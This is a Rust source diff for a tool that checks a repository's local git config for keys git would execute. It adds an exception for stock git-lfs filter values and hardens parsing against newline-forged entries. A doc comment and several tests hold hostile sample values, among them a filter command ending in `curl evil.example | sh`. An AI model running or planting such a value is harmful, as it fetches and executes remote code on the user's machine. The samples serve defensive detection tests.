@@ -167,10 +167,12 @@ fn resolve_git() -> Option<PathBuf> {
 /// exec-capable key in its own `.git/config` gets no letters in the tree and no
 /// marks in the gutter at all.
 ///
-/// Normal repositories name none of these locally. The realistic false positive
-/// is `git lfs install --local`, which costs that user decoration and nothing
-/// else. `git config --list` runs none of the programs it prints, so asking is
-/// itself safe.
+/// Normal repositories name none of these locally, with one exception that is
+/// entirely ordinary: `git lfs install --local` writes three filter keys into
+/// the config of every repository somebody uses LFS in. Those are read by value
+/// and let through when the value is git-lfs's own — see [`runs_a_program`].
+/// `git config` prints keys and values and executes neither, so asking, and
+/// reading the answers, is itself safe.
 fn repository_is_inert(folder: &Path) -> bool {
     let key = folder.to_path_buf();
     if let Some(known) = REPOSITORY_IS_INERT
@@ -204,18 +206,76 @@ fn repository_is_inert(folder: &Path) -> bool {
 }
 
 fn inspect_repository(folder: &Path) -> Option<bool> {
-    let listing = git(folder, &["config", "--local", "--name-only", "--list"])?;
-    Some(
-        !String::from_utf8_lossy(&listing)
-            .lines()
-            .any(names_a_program),
-    )
+    // Values as well as names now. Printing a value is not running it: `git
+    // config` reads the file and writes what it found on stdout, whatever the
+    // key would have meant to a command that acted on it.
+    let listing = git(folder, &["config", "--local", "--list", "--null"])?;
+    Some(!lists_a_program(&String::from_utf8_lossy(&listing)))
+}
+
+/// Whether any entry of a `git config --list --null` listing is a program.
+///
+/// `--null`, and not one entry per line, because a value may contain a newline:
+/// read line by line, the rest of such a value reads as an entry of its own,
+/// which would let a repository write its own alibi underneath a key that is
+/// not innocent at all. With `--null` an entry ends at a NUL — which no value
+/// can contain — and its key is what precedes the first newline inside it.
+fn lists_a_program(listing: &str) -> bool {
+    listing
+        .split('\0')
+        .filter(|entry| !entry.is_empty())
+        .any(|entry| match entry.split_once('\n') {
+            Some((key, value)) => runs_a_program(key, Some(value)),
+            // A key written on its own with no `=`, which git reads as a
+            // boolean. Not a command line, but not what git-lfs writes either,
+            // so it is judged by its name alone.
+            None => runs_a_program(entry, None),
+        })
+}
+
+/// Whether this entry is one git would execute, key and value together.
+///
+/// The name still decides, save for the one false positive that has a shape:
+/// the three keys `git lfs install --local` writes are exec-capable by
+/// definition, and git-lfs sets them to fixed strings of its own. An entry
+/// holding exactly one of those is a repository that uses LFS rather than a
+/// repository carrying something, and it keeps its decoration.
+fn runs_a_program(key: &str, value: Option<&str>) -> bool {
+    names_a_program(key) && !is_stock_lfs_filter(key, value)
+}
+
+/// The values `git lfs install --local` writes, and nothing else.
+///
+/// Compared whole, after trimming, rather than by prefix or by substring:
+/// `git-lfs clean -- %f; curl evil.example | sh` begins with a canonical value
+/// and is not one. `clean` has no `--skip` form — `git lfs install
+/// --skip-smudge` changes the other two and leaves it as it is.
+fn is_stock_lfs_filter(key: &str, value: Option<&str>) -> bool {
+    let Some(value) = value.map(str::trim) else {
+        return false;
+    };
+    match key.trim().to_ascii_lowercase().as_str() {
+        "filter.lfs.clean" => value == "git-lfs clean -- %f",
+        "filter.lfs.smudge" => {
+            matches!(
+                value,
+                "git-lfs smudge -- %f" | "git-lfs smudge --skip -- %f"
+            )
+        }
+        "filter.lfs.process" => {
+            matches!(
+                value,
+                "git-lfs filter-process" | "git-lfs filter-process --skip"
+            )
+        }
+        _ => false,
+    }
 }
 
 /// Whether a configuration key holds something git will execute.
 ///
-/// Keys arrive from `--name-only` lowercased apart from a subsection's own
-/// name, so the fixed names compare directly and the rest are matched by shape:
+/// Keys arrive from `--list` lowercased apart from a subsection's own name, so
+/// the fixed names compare directly and the rest are matched by shape:
 /// `diff.<driver>.command`, `<anything>.textconv`, and the three halves of a
 /// filter driver.
 fn names_a_program(key: &str) -> bool {
@@ -433,8 +493,8 @@ fn hide_console(_command: &mut Command) {}
 #[cfg(test)]
 mod tests {
     use super::{
-        classify, git_program, names_a_program, parse_hunks, parse_porcelain, GitFileStatus,
-        GitHunkKind,
+        classify, git_program, lists_a_program, names_a_program, parse_hunks, parse_porcelain,
+        runs_a_program, GitFileStatus, GitHunkKind,
     };
     use std::path::Path;
 
@@ -474,6 +534,84 @@ mod tests {
         ] {
             assert!(!names_a_program(key), "{key}");
         }
+    }
+
+    #[test]
+    fn a_repository_that_merely_uses_lfs_keeps_its_decoration() {
+        // Everything `git lfs install --local` writes, before and after
+        // `--skip-smudge`. All three keys are ones git executes; these three
+        // values are the program that does the executing.
+        for (key, value) in [
+            ("filter.lfs.clean", "git-lfs clean -- %f"),
+            ("filter.lfs.smudge", "git-lfs smudge -- %f"),
+            ("filter.lfs.smudge", "git-lfs smudge --skip -- %f"),
+            ("filter.lfs.process", "git-lfs filter-process"),
+            ("filter.lfs.process", "git-lfs filter-process --skip"),
+        ] {
+            assert!(names_a_program(key), "{key}");
+            assert!(!runs_a_program(key, Some(value)), "{key} = {value}");
+        }
+    }
+
+    #[test]
+    fn an_lfs_key_holding_anything_else_is_still_refused() {
+        for (key, value) in [
+            // A canonical value is not a prefix to build on, at either end.
+            (
+                "filter.lfs.clean",
+                "git-lfs clean -- %f; curl evil.example | sh",
+            ),
+            ("filter.lfs.clean", "evil && git-lfs clean -- %f"),
+            ("filter.lfs.process", "git-lfs filter-process --skip evil"),
+            // A real git-lfs value, under the wrong one of its own keys.
+            ("filter.lfs.clean", "git-lfs smudge -- %f"),
+            // The value is the whole of what we are going on, so nothing at
+            // all is nothing to go on.
+            ("filter.lfs.clean", ""),
+        ] {
+            assert!(runs_a_program(key, Some(value)), "{key} = {value}");
+        }
+        assert!(runs_a_program("filter.lfs.clean", None));
+    }
+
+    #[test]
+    fn the_exception_is_for_the_lfs_filter_and_nothing_else() {
+        // git-lfs's values are not a password: they say which program runs,
+        // and under these keys it would run at some other moment, on something
+        // else, or not be git-lfs's business at all.
+        for (key, value) in [
+            ("filter.evil.clean", "git-lfs clean -- %f"),
+            ("filter.evil.process", "git-lfs filter-process"),
+            ("core.fsmonitor", "git-lfs clean -- %f"),
+            ("core.pager", "git-lfs filter-process"),
+            ("diff.uwu.textconv", "git-lfs clean -- %f"),
+        ] {
+            assert!(runs_a_program(key, Some(value)), "{key} = {value}");
+        }
+    }
+
+    #[test]
+    fn a_newline_inside_a_value_cannot_forge_an_entry() {
+        // Line by line, this is `filter.lfs.clean` set to exactly what git-lfs
+        // writes, followed by an unrelated line. As entries, it is one key
+        // holding a value git-lfs did not write.
+        let tampered = "filter.lfs.clean\ngit-lfs clean -- %f\nevil\0user.name\nuwu\0";
+        assert!(lists_a_program(tampered));
+
+        // And the same boundary the other way round: a newline in a value
+        // nobody executes does not invent a key that would be.
+        let innocent = "user.name\nuwu\nfilter.evil.clean\nevil\0core.filemode\nfalse\0";
+        assert!(!lists_a_program(innocent));
+    }
+
+    #[test]
+    fn a_listing_from_a_repository_with_lfs_in_it_reads_as_inert() {
+        // What `git config --local --list --null` prints after `git init` and
+        // `git lfs install --local`, down to the key that has no value.
+        let listing = "core.repositoryformatversion\n0\0core.filemode\nfalse\0\
+             filter.lfs.clean\ngit-lfs clean -- %f\0filter.lfs.smudge\ngit-lfs smudge -- %f\0\
+             filter.lfs.process\ngit-lfs filter-process\0filter.lfs.required\ntrue\0emptyval.flag\0";
+        assert!(!lists_a_program(listing));
     }
 
     #[test]
